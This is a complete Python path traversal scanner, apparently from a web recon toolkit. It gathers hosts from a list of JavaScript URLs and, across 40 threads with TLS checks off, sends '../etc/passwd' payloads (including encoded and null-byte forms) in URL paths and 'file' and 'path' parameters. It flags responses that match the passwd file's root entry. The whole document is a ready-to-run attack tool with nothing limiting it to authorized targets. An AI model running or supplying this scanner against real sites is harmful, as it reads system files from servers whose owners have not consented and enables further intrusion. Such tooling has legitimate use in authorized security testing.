import sys, os, json, re, requests, threading
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

if len(sys.argv) < 2:
    print("Usage: ./path_traversal.py <project_dir> [wordlist_file]")
    sys.exit(1)

project_dir = sys.argv[1].rstrip("/")
wordlist_file = sys.argv[2] if len(sys.argv) > 2 else None
js_list = os.path.join(project_dir, "js", "all_js_files.txt")
outdir = os.path.join(project_dir, "path_traversal")
os.makedirs(outdir, exist_ok=True)
json_out = os.path.join(outdir, "results.json")
txt_out  = os.path.join(outdir, "results.txt")

# Quick default payloads (small, effective)
DEFAULT_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..%00/etc/passwd",
]

COMMON_DIRS = ["/", "/_next/", "/static/", "/assets/", "/uploads/", "/api/"]

SIG_RE = re.compile(r"root:.*:0:0:")  # simple /etc/passwd indicator

# Tunables
TIMEOUT = 4
THREADS = 40
MAX_CANDIDATES = 3   # limit candidate URLs per payload

# load payloads (wordlist optional)
if wordlist_file and os.path.isfile(wordlist_file):
    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as fh:
        payloads = [l.strip() for l in fh if l.strip() and not l.startswith("#")]
else:
    payloads = DEFAULT_PAYLOADS

# derive hosts + dirs from JS list
hosts = set()
dirs = {}
if os.path.isfile(js_list):
    with open(js_list) as fh:
        for line in fh:
            u = line.strip()
            if not u:
                continue
            if not u.startswith("http"):
                u = "https://" + u.lstrip("/")
            p = urlparse(u)
            host = p.netloc
            hosts.add(host)
            base_dir = os.path.dirname(p.path) + "/"
            dirs.setdefault(host, set()).add(base_dir)

# ensure each host has some candidate dirs
for h in list(hosts):
    for d in COMMON_DIRS:
        dirs.setdefault(h, set()).add(d)

# thread-local session for pooling
thread_local = threading.local()
def get_session():
    s = getattr(thread_local, "session", None)
    if s is None:
        s = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        s.mount("http://", adapter); s.mount("https://", adapter)
        thread_local.session = s
    return s

def looks_like_file(text):
    if not text:
        return False
    if SIG_RE.search(text):
        return True
    if text.count("\n") >= 3 and text.count(":") >= 3:
        return True
    return False

def build_candidates(host, base_path, payload):
    if not base_path.startswith("/"):
        base_path = "/" + base_path
    root = f"https://{host}"
    c = []
    c.append(urljoin(root + base_path, payload))
    c.append(root + base_path + "?file=" + payload)
    c.append(root + base_path + "?path=" + payload)
    return c[:MAX_CANDIDATES]

# HEAD-first, then GET if promising
def head_then_get(url):
    s = get_session()
    try:
        r = s.head(url, timeout=TIMEOUT, verify=False, allow_redirects=False)
        code = getattr(r, "status_code", 0)
        if code in (200, 206):
            # fetch body if content-type not large HTML
            ctype = r.headers.get("Content-Type", "").lower()
            clen = r.headers.get("Content-Length")
            if "text/html" in ctype and (clen is None or int(clen) > 15000):
                return code, ""
            rg = s.get(url, timeout=TIMEOUT, verify=False, allow_redirects=False)
            return getattr(rg, "status_code", 0), getattr(rg, "text", "")[:5000]
        return code, ""
    except Exception:
        return 0, ""

def test_combo(host, base_path, payload):
    for url in build_candidates(host, base_path, payload):
        status, body = head_then_get(url)
        if status == 200:
            if looks_like_file(body):
                return {"host": host, "payload": payload, "url": url, "status": status}
        if status == 206:
            return {"host": host, "payload": payload, "url": url, "status": status}
    return None

# queue tasks
tasks = []
with ThreadPoolExecutor(max_workers=THREADS) as exe:
    for host in sorted(dirs.keys()):
        print(f"[-] Testing host: {host}")
        for base_path in sorted(dirs[host]):
            for payload in payloads:
                tasks.append(exe.submit(test_combo, host, base_path, payload))

    total = len(tasks)
    print(f"[+] Total tests queued: {total}")
    done = 0
    findings = []
    for fut in as_completed(tasks):
        done += 1
        if done % 200 == 0:
            print(f"    ... {done}/{total} tests completed")
        try:
            res = fut.result()
            if res:
                findings.append(res)
        except Exception:
            pass

# dedupe
unique = []
seen = set()
for r in findings:
    k = (r["host"], r["url"])
    if k in seen:
        continue
    seen.add(k); unique.append(r)

with open(json_out, "w") as jf:
    json.dump(unique, jf, indent=2)
with open(txt_out, "w") as tf:
    if not unique:
        tf.write("No path traversal findings.\n")
    else:
        for r in unique:
            tf.write(f"{r['host']} | {r['payload']} | status={r['status']} | url={r['url']}\n")

print(f"[+] path traversal done → {outdir}")
